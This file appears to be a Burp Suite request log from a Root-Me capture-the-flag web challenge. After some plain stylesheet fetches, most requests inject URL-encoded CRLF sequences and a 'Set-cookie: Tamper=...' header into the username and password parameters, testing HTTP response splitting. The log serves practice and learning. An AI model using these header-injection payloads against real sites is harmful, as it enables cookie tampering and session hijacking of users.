@@ -1,0 +1,266 @@
+GET /template/s.css HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: https://challenge01.root-me.org/web-serveur/ch14/
+Sec-Fetch-Dest: style
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+X-Burp-Comment:   |  
+
+
+========
+GET /template/s.css HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Referer: http://challenge01.root-me.org/web-serveur/ch14/
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /template/s.css HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://challenge01.root-me.org/web-serveur/ch14/
+X-Burp-Comment:   |  
+
+
+========
+GET /template/s.css HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://challenge01.root-me.org/web-serveur/ch14/
+X-Burp-Comment:   |  
+
+
+========
+GET /template/s.css HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://challenge01.root-me.org/web-serveur/ch14
+X-Burp-Comment:   |  
+
+
+========
+GET /template/s.css HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/css,*/*;q=0.1
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://challenge01.root-me.org/web-serveur/ch14?name=abc
+X-Burp-Comment:   |  
+
+
+========
+GET /web-serveur/ch14/2245045820074892377 HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+X-Burp-Comment:   |  
+
+
+========
+GET /web-serveur/ch14/?username=Set-cookie%3A+Tamper%3D099fb581-12e3-41c6-8c6c-141915efd672&password= HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://challenge01.root-me.org/web-serveur/ch14/
+Cookie: PHPSESSID=e105dd92fa2574d8b8fca351942dd1d4
+Upgrade-Insecure-Requests: 1
+X-Burp-Comment:   |  
+
+
+========
+GET /web-serveur/ch14/?username=any%0D%0ASet-cookie%3A+Tamper%3D099fb581-12e3-41c6-8c6c-141915efd672&password= HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://challenge01.root-me.org/web-serveur/ch14/
+Cookie: PHPSESSID=e105dd92fa2574d8b8fca351942dd1d4
+Upgrade-Insecure-Requests: 1
+X-Burp-Comment:   |  
+
+
+========
+GET /web-serveur/ch14/?username=any%3F%0D%0ASet-cookie%3A+Tamper%3D099fb581-12e3-41c6-8c6c-141915efd672&password= HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://challenge01.root-me.org/web-serveur/ch14/
+Cookie: PHPSESSID=e105dd92fa2574d8b8fca351942dd1d4
+Upgrade-Insecure-Requests: 1
+X-Burp-Comment:   |  
+
+
+========
+GET /web-serveur/ch14/?username=any%0ASet-cookie%3A+Tamper%3D099fb581-12e3-41c6-8c6c-141915efd672&password= HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://challenge01.root-me.org/web-serveur/ch14/
+Cookie: PHPSESSID=e105dd92fa2574d8b8fca351942dd1d4
+Upgrade-Insecure-Requests: 1
+X-Burp-Comment:   |  
+
+
+========
+GET /web-serveur/ch14/?username=any%3F%0ASet-cookie%3A+Tamper%3D099fb581-12e3-41c6-8c6c-141915efd672&password= HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://challenge01.root-me.org/web-serveur/ch14/
+Cookie: PHPSESSID=e105dd92fa2574d8b8fca351942dd1d4
+Upgrade-Insecure-Requests: 1
+X-Burp-Comment:   |  
+
+
+========
+GET /web-serveur/ch14/?username=any%0D%0ASet-cookie%3A+Tamper%3D099fb581-12e3-41c6-8c6c-141915efd672%0D%0A&password= HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://challenge01.root-me.org/web-serveur/ch14/
+Cookie: PHPSESSID=e105dd92fa2574d8b8fca351942dd1d4
+Upgrade-Insecure-Requests: 1
+X-Burp-Comment:   |  
+
+
+========
+GET /web-serveur/ch14/?username=any%3F%0D%0ASet-cookie%3A+Tamper%3D099fb581-12e3-41c6-8c6c-141915efd672%0D%0A&password= HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://challenge01.root-me.org/web-serveur/ch14/
+Cookie: PHPSESSID=e105dd92fa2574d8b8fca351942dd1d4
+Upgrade-Insecure-Requests: 1
+X-Burp-Comment:   |  
+
+
+========
+GET /web-serveur/ch14/?username=qFhQnUEJ&password=Set-cookie%3A+Tamper%3D099fb581-12e3-41c6-8c6c-141915efd672 HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://challenge01.root-me.org/web-serveur/ch14/
+Cookie: PHPSESSID=e105dd92fa2574d8b8fca351942dd1d4
+Upgrade-Insecure-Requests: 1
+X-Burp-Comment:   |  
+
+
+========
+GET /web-serveur/ch14/?username=qFhQnUEJ&password=any%0D%0ASet-cookie%3A+Tamper%3D099fb581-12e3-41c6-8c6c-141915efd672 HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://challenge01.root-me.org/web-serveur/ch14/
+Cookie: PHPSESSID=e105dd92fa2574d8b8fca351942dd1d4
+Upgrade-Insecure-Requests: 1
+X-Burp-Comment:   |  
+
+
+========
+GET /web-serveur/ch14/?username=qFhQnUEJ&password=any%3F%0D%0ASet-cookie%3A+Tamper%3D099fb581-12e3-41c6-8c6c-141915efd672 HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://challenge01.root-me.org/web-serveur/ch14/
+Cookie: PHPSESSID=e105dd92fa2574d8b8fca351942dd1d4
+Upgrade-Insecure-Requests: 1
+X-Burp-Comment:   |  
+
+
+========
+GET /web-serveur/ch14/?username=qFhQnUEJ&password=any%0ASet-cookie%3A+Tamper%3D099fb581-12e3-41c6-8c6c-141915efd672 HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://challenge01.root-me.org/web-serveur/ch14/
+Cookie: PHPSESSID=e105dd92fa2574d8b8fca351942dd1d4
+Upgrade-Insecure-Requests: 1
+X-Burp-Comment:   |  
+
+
+========
+GET /web-serveur/ch14/?username=qFhQnUEJ&password=any%3F%0ASet-cookie%3A+Tamper%3D099fb581-12e3-41c6-8c6c-141915efd672 HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://challenge01.root-me.org/web-serveur/ch14/
+Cookie: PHPSESSID=e105dd92fa2574d8b8fca351942dd1d4
+Upgrade-Insecure-Requests: 1
+X-Burp-Comment:   |  
+
+
+========
+GET /web-serveur/ch14/?username=qFhQnUEJ&password=any%0D%0ASet-cookie%3A+Tamper%3D099fb581-12e3-41c6-8c6c-141915efd672%0D%0A HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://challenge01.root-me.org/web-serveur/ch14/
+Cookie: PHPSESSID=e105dd92fa2574d8b8fca351942dd1d4
+Upgrade-Insecure-Requests: 1
+X-Burp-Comment:   |  
+
+
+========
+GET /web-serveur/ch14/?username=qFhQnUEJ&password=any%3F%0D%0ASet-cookie%3A+Tamper%3D099fb581-12e3-41c6-8c6c-141915efd672%0D%0A HTTP/1.1
+Host: challenge01.root-me.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: close
+Referer: http://challenge01.root-me.org/web-serveur/ch14/
+Cookie: PHPSESSID=e105dd92fa2574d8b8fca351942dd1d4
+Upgrade-Insecure-Requests: 1
+X-Burp-Comment:   |  
+
+
+========
